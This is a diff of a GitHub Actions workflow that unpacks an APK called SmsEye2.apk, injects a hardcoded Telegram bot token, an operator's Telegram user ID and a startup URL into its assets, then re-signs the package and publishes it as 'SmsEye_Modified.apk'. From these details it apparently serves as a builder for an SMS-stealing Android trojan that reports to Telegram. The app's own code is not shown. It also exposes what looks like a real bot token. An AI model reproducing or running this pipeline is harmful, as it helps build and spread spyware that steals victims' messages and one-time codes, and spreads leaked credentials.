@@ -1,13 +1,13 @@
-name: Inject ID and URL into APK
+name: Inject assets into APK without rebuilding
 
 on:
   workflow_dispatch:
     inputs:
       user_id:
-        description: 'Telegram numeric user ID (for id.txt)'
+        description: 'Telegram numeric user ID (id.txt)'
         required: true
       app_url:
-        description: 'Startup URL to inject in url.txt'
+        description: 'Startup URL (url.txt)'
         required: true
 
 jobs:
@@ -18,50 +18,43 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Install dependencies and Apktool
+    - name: Install tools
       run: |
         sudo apt update
-        sudo apt install -y default-jdk wget zipalign curl
-        # Get latest Apktool .jar
-        APKTOOL_URL=$(curl -s https://api.github.com/repos/iBotPeaches/Apktool/releases/latest \
-          | grep browser_download_url | grep 'apktool_' | grep '.jar' | cut -d '"' -f 4)
-        wget "$APKTOOL_URL" -O apktool.jar
+        sudo apt install -y default-jdk zipalign unzip
 
-    - name: Copy APK from root of repo
+    - name: Unpack APK
       run: |
-        cp SmsEye2.apk base.apk
+        mkdir working
+        cp SmsEye2.apk original.apk
+        unzip -q original.apk -d working
 
-    - name: Decompile APK
+    - name: Inject files into assets/
       run: |
-        java -jar apktool.jar d base.apk -o decoded_apk --force
+        echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > working/assets/token.txt
+        echo "${{ github.event.inputs.user_id }}" > working/assets/id.txt
+        echo "${{ github.event.inputs.app_url }}" > working/assets/url.txt
 
-    - name: Inject Telegram token, user ID, and startup URL
+    - name: Rebuild APK
       run: |
-        echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > decoded_apk/assets/token.txt
-        echo "${{ github.event.inputs.user_id }}" > decoded_apk/assets/id.txt
-        echo "${{ github.event.inputs.app_url }}" > decoded_apk/assets/url.txt
-
-    - name: Rebuild APK with apktool
-      run: |
-        java -jar apktool.jar b decoded_apk -o unsigned.apk
+        cd working
+        zip -r ../unsigned.apk *
+        cd ..
 
     - name: Align and Sign APK
       run: |
-        # Align the APK (required before signing)
         zipalign -v 4 unsigned.apk aligned.apk
 
-        # Generate signing key
         keytool -genkey -v -keystore keystore.jks -storepass password -alias key0 -keypass password \
           -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=SmsEye"
 
-        # Sign the APK
         jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
           -keystore keystore.jks -storepass password -keypass password aligned.apk key0
 
         mv aligned.apk SmsEye_Modified.apk
 
-    - name: Upload Final APK
+    - name: Upload APK
       uses: actions/upload-artifact@v4
       with:
-        name: SmsEye-Patched-APK
+        name: Final-Patched-APK
         path: SmsEye_Modified.apk
